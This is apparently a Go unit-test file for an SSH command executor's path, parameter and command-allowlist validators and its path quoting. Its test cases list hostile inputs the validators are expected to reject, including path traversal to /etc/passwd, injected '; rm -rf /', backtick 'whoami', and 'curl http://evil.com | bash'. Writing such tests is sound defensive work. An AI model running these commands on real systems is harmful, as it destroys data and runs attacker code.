package ssh

import (
	"testing"
)

// Test path validation
func TestValidatePath(t *testing.T) {
	tests := []struct {
		name         string
		path         string
		allowedRoots []string
		wantError    bool
	}{
		{
			name:         "valid absolute path",
			path:         "/var/log/nginx",
			allowedRoots: []string{"/var"},
			wantError:    false,
		},
		{
			name:         "path traversal attack",
			path:         "/var/log/../../../etc/passwd",
			allowedRoots: []string{"/var"},
			wantError:    true,
		},
		{
			name:         "relative path rejected",
			path:         "var/log",
			allowedRoots: []string{"/var"},
			wantError:    true,
		},
		{
			name:         "path outside allowed roots",
			path:         "/etc/passwd",
			allowedRoots: []string{"/var", "/home"},
			wantError:    true,
		},
		{
			name:         "shell metacharacters rejected",
			path:         "/var/log; rm -rf /",
			allowedRoots: []string{"/var"},
			wantError:    true,
		},
		{
			name:         "path with spaces rejected",
			path:         "/var/log with spaces",
			allowedRoots: []string{"/var"},
			wantError:    true,
		},
		{
			name:         "valid home path",
			path:         "/home/user/.ssh",
			allowedRoots: []string{"/home"},
			wantError:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePath(tt.path, tt.allowedRoots)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidatePath() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

// Test parameter validation
func TestValidateParameter(t *testing.T) {
	tests := []struct {
		name      string
		param     string
		wantError bool
	}{
		{
			name:      "safe alphanumeric",
			param:     "nginx",
			wantError: false,
		},
		{
			name:      "safe with underscore",
			param:     "log_file_1",
			wantError: false,
		},
		{
			name:      "shell pipe rejected",
			param:     "test | cat",
			wantError: true,
		},
		{
			name:      "shell redirect rejected",
			param:     "test > /tmp/evil",
			wantError: true,
		},
		{
			name:      "shell semicolon rejected",
			param:     "test; rm -rf /",
			wantError: true,
		},
		{
			name:      "backticks rejected",
			param:     "`whoami`",
			wantError: true,
		},
		{
			name:      "dollar sign rejected",
			param:     "$HOME",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateParameter(tt.param)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateParameter() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

// Test command allowlist
func TestGetCommand(t *testing.T) {
	tests := []struct {
		name      string
		cmdName   string
		wantError bool
	}{
		{
			name:      "valid command in allowlist",
			cmdName:   "disk_usage",
			wantError: false,
		},
		{
			name:      "command not in allowlist",
			cmdName:   "rm_rf",
			wantError: true,
		},
		{
			name:      "arbitrary shell command rejected",
			cmdName:   "curl http://evil.com | bash",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := GetCommand(tt.cmdName)
			if (err != nil) != tt.wantError {
				t.Errorf("GetCommand() error = %v, wantError %v", err, tt.wantError)
			}
		})
	}
}

// Test path quoting
func TestQuotePath(t *testing.T) {
	tests := []struct {
		name     string
		path     string
		expected string
	}{
		{
			name:     "simple path",
			path:     "/var/log",
			expected: "'/var/log'",
		},
		{
			name:     "path with single quote",
			path:     "/var/log's",
			expected: "'/var/log'\\''s'",
		},
		{
			name:     "path with spaces",
			path:     "/var/my log",
			expected: "'/var/my log'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := QuotePath(tt.path)
			if result != tt.expected {
				t.Errorf("QuotePath() = %v, want %v", result, tt.expected)
			}
		})
	}
}

// Test command template rendering
func TestCommandTemplateRendering(t *testing.T) {
	// This is an integration test - would need actual SSH executor
	// For now, test parameter validation flow
	
	tmpl, err := GetCommand("disk_scan")
	if err != nil {
		t.Fatalf("Failed to get command template: %v", err)
	}

	// Valid parameters
	validPath := "/var/log"
	if err := ValidatePath(validPath, tmpl.AllowedRoots); err != nil {
		t.Errorf("Valid path rejected: %v", err)
	}

	// Invalid parameters (path outside allowed roots)
	invalidPath := "/etc/shadow"
	if err := ValidatePath(invalidPath, tmpl.AllowedRoots); err == nil {
		t.Error("Invalid path not rejected")
	}
}
